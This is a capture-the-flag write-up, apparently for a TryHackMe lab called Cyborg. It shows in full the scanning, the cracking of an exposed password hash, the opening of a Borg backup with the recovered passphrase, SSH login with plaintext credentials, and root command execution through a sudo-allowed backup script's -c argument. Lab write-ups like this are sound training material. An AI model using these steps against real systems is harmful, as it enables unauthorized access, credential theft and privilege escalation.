# Cyborg

Starting with default recon:
```sh
nmap -sV -T4 10.10.57.223                                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 10:54 CEST
Nmap scan report for 10.10.57.223
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

Direcotry Scanning:
```sh
ffuf -u http://10.10.57.223/FUZZ -w ../../webhacking/wordlists/directory_scanner/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.57.223/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: .hta

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: .htaccess

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 69ms]
    * FUZZ: admin

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 73ms]
    * FUZZ: etc

[Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 75ms]
    * FUZZ: index.html

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 75ms]
    * FUZZ: server-status

:: Progress: [4613/4613] :: Job [1/1] :: 566 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

Curling suspicious directory:
```sh
curl http://10.10.57.223/etc/                    
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /etc</title>
 </head>
 <body>
<h1>Index of /etc</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="squid/">squid/</a></td><td align="right">2020-12-30 02:09  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.57.223 Port 80</address>
</body></html>
```

Curling next:
```sh
curl http://10.10.57.223/etc/squid/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /etc/squid</title>
 </head>
 <body>
<h1>Index of /etc/squid</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/etc/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="passwd">passwd</a></td><td align="right">2020-12-30 02:09  </td><td align="right"> 52 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/script.gif" alt="[   ]"></td><td><a href="squid.conf">squid.conf</a></td><td align="right">2020-12-30 02:09  </td><td align="right">258 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.57.223 Port 80</address>
</body></html>
```

Curling last:
```sh
curl http://10.10.57.223/etc/squid/passwd 
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Identifying found hash:
```sh
hash-identifier                                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
```

Bruteforce:
```sh
hashcat --force -m 1600 -a 0 hash.txt ../../Desktop/rockyou.txt --show                                                                                                 
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```

It doesn't seem like they are user credentials because I can't login iwth those:
```sh
ssh music_archive@10.10.57.223
The authenticity of host '10.10.57.223 (10.10.57.223)' can't be established.
ED25519 key fingerprint is SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.57.223' (ED25519) to the list of known hosts.
music_archive@10.10.57.223's password: 
Permission denied, please try again.
```

Going back to the index.html we are able to download a tar archive:
```sh
tar -xvf archive.tar      
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

Looking at output:
```sh
ls -R home 
home:
field

home/field:
dev

home/field/dev:
final_archive

home/field/dev/final_archive:
README  config  data  hints.5  index.5  integrity.5  nonce

home/field/dev/final_archive/data:
0

home/field/dev/final_archive/data/0:
1  3  4  5
```

Checking out the files:
```sh
cat README  
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

This hints us that borg compression was used. Now we use this info to unzip the borg archive.
```sh
borg extract home/field/dev/final_archive::music_archive 
Enter passphrase for key /home/kali/tryhackme/cyborg/home/field/dev/final_archive: 
```

using `squidward` as password we are able to extract the whole archive.
```sh
 ls -R home/alex 
home/alex:
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

home/alex/Desktop:
secret.txt

home/alex/Documents:
note.txt

home/alex/Downloads:

home/alex/Music:

home/alex/Pictures:

home/alex/Public:

home/alex/Templates:

home/alex/Videos:
```

Looking at the new files:
```sh
cat home/alex/Documents/note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

```sh
cat home/alex/Desktop/secret.txt 
shoutout to all the people who have gotten to this stage whoop whoop!"
```

Using the new found creds we are able to login:
```sh
ssh alex@10.10.57.223           
alex@10.10.57.223's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.

Last login: Sun Oct  8 02:45:25 2023 from 10.18.20.25
alex@ubuntu:~$ 
alex@ubuntu:~$ 
alex@ubuntu:~$ whoami
alex
```

We also got the first flag:
```sh
ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

Now we have to do some priviledge escalation:
```sh
sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Recon:
```sh
ls /etc/mp3backups/
backed_up_files.txt  backup.sh  ubuntu-scheduled.tgz
```

```sh
cat backed_up_files.txt 
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
```

```sh
cat backup.sh 
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

Looking at the bash file code above we are able to identify that a command is executed at the end. We may be able to use this.
```sh
sudo /etc/mp3backups/backup.sh -c whoami
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
root
```

Knowing this is being executed as root we are able to read the flag:
```sh
sudo /etc/mp3backups/backup.sh -c "ls /root/"
...
Backup finished
root.txt
```

Finally reading the last Flag:
```sh
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
...
Backup finished
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
